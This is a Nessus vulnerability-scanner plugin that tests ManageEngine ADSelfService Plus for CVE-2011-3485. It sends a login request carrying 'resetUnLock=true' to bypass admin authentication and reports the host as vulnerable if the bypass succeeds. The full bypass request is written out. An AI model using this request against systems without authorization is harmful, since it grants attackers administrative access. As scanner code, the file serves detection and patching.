#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(56511);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/08/15 17:51:38 $");

  script_cve_id("CVE-2011-3485");
  script_bugtraq_id(50071);
  script_osvdb_id(76282);

  script_name(english:"ManageEngine ADSelfService Plus resetUnLock Authentication Bypass");
  script_summary(english:"Tries to bypass authentication");

  script_set_attribute(attribute:"synopsis", value:
"It was possible to bypass authentication in a web application hosted
on the remote web server.");
  script_set_attribute(attribute:"description", value:
"The instance of ManageEngine ADSelfService Plus running on the remote
web server allows a remote attacker to bypass authentication and gain
administrative access by including a parameter named 'resetUnLock' and
setting it to 'true' when authenticating.");
  # http://blog.emaze.net/2011/10/zoho-manageengine-adselfservice-plus.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?62d4a5d1");
  # http://forums.manageengine.com/topic/adselfservice-plus-fixes-and-enhancements
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?de336448");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ADSelfService Plus version 4.5 Build 4522 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/10/11");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/10/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/10/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_adselfservice_plus");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_adselfservice_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("installed_sw/ManageEngine ADSelfService Plus");
  script_require_ports("Services/www", 8888);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:8888);

install = get_single_install(app_name:'ManageEngine ADSelfService Plus', port:port);
dir = install['path'];
install_url = build_url(port:port, qs:dir+"/authorization.do");

# Clear the cookies, in case Nessus was given credentials.
clear_cookiejar();

# Try to log in.
user = 'admin';
pass = SCRIPT_NAME;

url = dir + '/authorization.do';
res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE, follow_redirect:1);
if (
  'action="j_security_check?loginComponent=AdminLogin&formSubmit=SSP' >!< res[2] &&
  'src="showLogin.cc?logincomponent=yes"' >!< res[2]
) exit(1, "The ManageEngine ADSelfService Plus install at "+install_url+" has an unexpected form.");

# Make sure we have a session cookie.
val = get_http_cookie(name:"JSESSIONID");
if (isnull(val)) val = get_http_cookie(name:"JSESSIONIDADSSP");
if (isnull(val)) exit(1, "Failed to extract the session cookie from the ManageEngine ADSelfService Plus install at "+install_url+".");

postdata =
  'j_username=' + user + '&' +
  'j_password=' + pass + '&' +
  'domainName=ADSelfService+Plus+Authentication&' +
  'domainName=-&' +
  'DIGEST=captcha&' +
  'AUTHRULE_NAME=ADAuthenticator&' +
  'resetUnLock=true';

url2 = dir + '/j_security_check?loginComponent=AdminLogin&formSubmit=SSP';
req2 = http_mk_post_req(
  port         : port,
  item         : url2,
  data         : postdata,
  content_type : "application/x-www-form-urlencoded"
);
res2 = http_send_recv_req(
  port:port,
  req:req2,
  follow_redirect : 2,
  exit_on_fail    : TRUE
);

if (
  '>Welcome,&nbsp;&nbsp;<b>' + user + '</b>' >< res2[2] ||
  egrep(pattern:">Sign out<", string:res2[2])
)
{
  report =
    '\nNessus was able to exploit this issue to bypass authentication and' +
    '\ngain access to a page using the following request :' +
    '\n' +
    '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) +
    '\n' + http_mk_buffer_from_req(req:req2) +
    '\n' + crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30) + '\n';
  security_report_v4(severity:SECURITY_HOLE, port:port, extra:report);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine ADSelfService Plus", install_url);
